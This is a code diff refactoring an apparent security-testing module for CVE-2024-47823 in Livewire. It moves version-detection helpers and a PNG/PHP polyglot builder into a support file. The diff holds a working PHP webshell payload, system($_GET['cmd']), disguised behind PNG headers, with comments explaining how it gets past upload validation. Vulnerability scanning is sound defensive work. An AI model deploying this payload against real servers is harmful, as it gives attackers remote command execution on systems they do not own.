@@ -48,15 +48,24 @@ from modules.generators.livewire_filemanager_endpoints import (
     CVE_2024_47823_EXTRA_PATH_HINTS,
     LIVEWIRE_UPLOAD_ENDPOINTS as GENERATOR_LIVEWIRE_UPLOAD_ENDPOINTS,
 )
+# Pure leaf helpers extracted to keep this file smaller (behavior-identical); re-imported
+# so cve_2024_47823.<name> still resolves for callers and tests.
+from modules.cves._cve_2024_47823_support import (  # noqa: F401
+    LIVEWIRE_VERSION_PATTERN,
+    _extract_version_from_livewire_js,
+    _extract_version_from_text,
+    _normalize_version_tuple,
+    _is_version_vulnerable,
+    _PNG_MAGIC,
+    _WEBSHELL,
+    _build_png_php_polyglot,
+)
 
 requests.packages.urllib3.disable_warnings(
     requests.packages.urllib3.exceptions.InsecureRequestWarning
 )
 
 # Patterns & hints
-LIVEWIRE_VERSION_PATTERN = re.compile(
-    r"(?:Livewire(?:\.|%2[Ee])?[^\d{0,2}]*)v?(\d+\.\d+\.\d+)", re.IGNORECASE
-)
 SCRIPT_SRC_PATTERN = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
 WIRE_HINTS = ("wire:", "wire:model", "wire:click", "livewire")
 
@@ -371,61 +380,6 @@ def _probe_composer_lock(base: str, sess=None, timeout: int = 6) -> Optional[Dic
         if pkg.get("name") == "livewire/livewire":
             return pkg
     return None
-
-
-def _extract_version_from_livewire_js(text: Optional[str]) -> Optional[str]:
-    if not text:
-        return None
-
-    # Prefer explicit Livewire version assignments/comments when present.
-    m = re.search(
-        r"(?:window\.)?(?:Livewire|livewire)[^;\n\r]{0,80}?"
-        r"version\s*[:=]\s*[\"']v?(\d+\.\d+(?:\.\d+)?)[\"']",
-        text,
-        re.I,
-    )
-    if m:
-        return m.group(1).lstrip("vV")
-
-    # Livewire's minified JS can expose only a bare object token like:
-    #   {version:"3.15.12", ...}
-    m = re.search(r"\bversion\s*:\s*[\"']v?(\d+\.\d+(?:\.\d+)?)[\"']", text, re.I)
-    if m:
-        return m.group(1).lstrip("vV")
-
-    return None
-
-
-def _extract_version_from_text(text: Optional[str]) -> Optional[str]:
-    version = _extract_version_from_livewire_js(text)
-    if version:
-        return version
-
-    m2 = LIVEWIRE_VERSION_PATTERN.search(text)
-    if m2:
-        return m2.group(1).lstrip("vV")
-    return None
-
-
-def _normalize_version_tuple(v: str):
-    try:
-        parts = v.split(".")
-        parts = parts + ["0"] * (3 - len(parts))
-        return tuple(int(x) for x in parts[:3])
-    except Exception:
-        return None
-
-
-def _is_version_vulnerable(version: str) -> Optional[bool]:
-    t = _normalize_version_tuple(version)
-    if not t:
-        return None
-    major = t[0]
-    if major == 2:
-        return t < _normalize_version_tuple("2.12.7")
-    if major == 3:
-        return t < _normalize_version_tuple("3.5.2")
-    return False
 
 
 def _perform_safe_upload_test(base: str, endpoint: str, sess=None, timeout: int = 10) -> Optional[Dict]:
@@ -945,8 +899,6 @@ def _candidate_upload_paths(base_url: str, route_map=None, detection=None, detec
 # PNG magic header so MIME sniffing (and Livewire's guessExtension()) classify the
 # bytes as image/png -- that is the validation bypass. PHP still executes the
 # trailing <?php ... ?> block when the file is served as .php.
-_PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
-_WEBSHELL = _PNG_MAGIC + b"\n<?php system($_GET['cmd']); ?>\n"
 
 
 # The sibling CVE the unauth fallback actually demonstrates on a PATCHED Livewire:
@@ -1031,27 +983,6 @@ _PUBLIC_LW2_FIELD = "upload"
 _PUBLIC_LW2_SAVE_METHOD = "save"
 _PUBLIC_LW2_STORAGE_DIR = "lab-uploads"
 
-
-def _build_png_php_polyglot(command_marker: bytes = b"<?php system($_GET['cmd']); ?>") -> bytes:
-    """A REAL 1x1 PNG (valid IHDR/IDAT/IEND) with PHP appended after IEND.
-
-    A bare 8-byte PNG magic is not enough for the authenticated path: Filament's
-    ->image() validation runs mime_content_type()/getimagesize() on the stored temp
-    file, and 8 magic bytes resolve to application/octet-stream (validation fails).
-    A structurally-valid PNG passes the image check (the CVE bypass) while PHP still
-    executes the trailing block when the file is served as .php.
-    """
-    def _chunk(typ: bytes, data: bytes) -> bytes:
-        body = typ + data
-        return struct.pack(">I", len(data)) + body + struct.pack(">I", zlib.crc32(body) & 0xFFFFFFFF)
-
-    png = (
-        _PNG_MAGIC
-        + _chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
-        + _chunk(b"IDAT", zlib.compress(b"\x00\xff\x00\x00"))
-        + _chunk(b"IEND", b"")
-    )
-    return png + b"\n" + command_marker + b"\n"
 
 
 def _filament_login(session: requests.Session, root: str, username: str,
